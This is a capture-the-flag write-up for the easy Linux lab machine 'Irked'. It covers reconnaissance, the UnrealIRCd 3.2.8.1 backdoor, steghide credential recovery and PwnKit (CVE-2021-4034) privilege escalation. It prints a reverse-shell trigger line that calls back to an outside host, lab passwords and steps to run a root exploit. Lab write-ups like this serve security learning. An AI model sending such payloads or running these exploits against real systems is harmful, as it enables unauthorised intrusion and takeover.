# Irked

**Difficulty:** Easy | **OS:** Linux | **IP:** `10.129.60.85`

## Summary
**Irked** is an easy-difficulty Linux machine that demonstrates the risks of running backdoor-compromised IRC software, steganographic key leakage, and unpatched local SUID binaries. Initial access is achieved by targeting an UnrealIRCd 3.2.8.1 service running on IRC ports, which contains a well-known malicious backdoor allowing arbitrary command execution. Steganographic analysis of an image found on the web server (using credentials extracted from a local backup file) yields SSH credentials for user `djmardov`. Privilege escalation to `root` is performed by exploiting a local privilege escalation flaw in the SUID-root binary `pkexec` (PwnKit - CVE-2021-4034).

## Reconnaissance

### Port Scanning (Nmap)
We begin by identifying open TCP ports and active service versions:

- **22**: SSH (OpenSSH 6.7p1 (Debian 8))
- **80**: HTTP (Apache httpd 2.4.10)
- **111**: RPC (rpcbind 2-4)
- **6697**: IRC (UnrealIRCd)
- **8067**: IRC (UnrealIRCd)
- **65534**: IRC (UnrealIRCd)

### Web & Service Enumeration
1) Visiting the web application on port 80 shows an image `irked.jpg` alongside the text: `"IRC is almost working!"`.
2) Inspecting the IRC service version confirms **UnrealIRCd 3.2.8.1**.

## Exploitation (Initial Access)

### UnrealIRCd 3.2.8.1 Backdoor Command Execution
UnrealIRCd version 3.2.8.1 contains a historical backdoor flaw where sending commands prefixed with `AB;` allows unauthenticated command execution on the host.

- **Vulnerability Mechanism:** The backdoor triggers execution of any system command appended directly after the `AB;` trigger string sent over an open IRC connection socket.
- **Execution:**

  1) Connect to one of the open IRC ports (e.g., `6697`) using Netcat:
  
  ```nc 10.129.60.85 6697```

  2) Send the backdoor trigger with an interactive reverse shell payload:

  ```AB; bash -c "bash -i >& /dev/tcp/10.10.14.28/443 0>&1"```

  3) An interactive reverse shell is established, granting initial access under the `ircd` service account.

## Privilege Escalation (Root Flag)

### Steganography & Lateral Movement (djmardov)
Enumerating local directories reveals a hidden file `.backup` in `/home/djmardov/` containing a note:

```
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```

Using this passphrase to inspect and extract hidden data from the web server image (`irked.jpg` / `Untitled.jpeg`) using `steghide`:

```steghide extract -sf irked.jpg -p "UPupDOWNdownLRlrBAbaSSss"```

- Extracted File: `pass.txt`
- Recovered Credentials: `djmardov` : `Kab6h+m+bbp2J:HG`

Authenticating as `djmardov` via SSH or `su` grants access to the user account and enables retrieval of `user.txt`.

## Local Privilege Escalation via PwnKit (CVE-2021-4034)
Checking SUID binaries on the machine reveals the presence of `/usr/bin/pkexec`:

```find / -perm -4000 2>/dev/null```

- **Vulnerability Mechanism (PwnKit):** An out-of-bounds argument parsing flaw in PolicyKit's `pkexec` utility allows unprivileged local users to load a custom shared library and execute commands as `root`.
- **Privilege Escalation Workflow:**

1) Transfer a standard PwnKit exploit binary or source code targeting CVE-2021-4034 to `/tmp/`.
2) Execute the exploit binary to trigger local privilege escalation:

```
cd /tmp
./pwnkit
id
# uid=0(root) gid=0(root) groups=0(root)
```

Full administrative `root` privileges are obtained, allowing retrieval of root.txt from `/root/root.txt`.
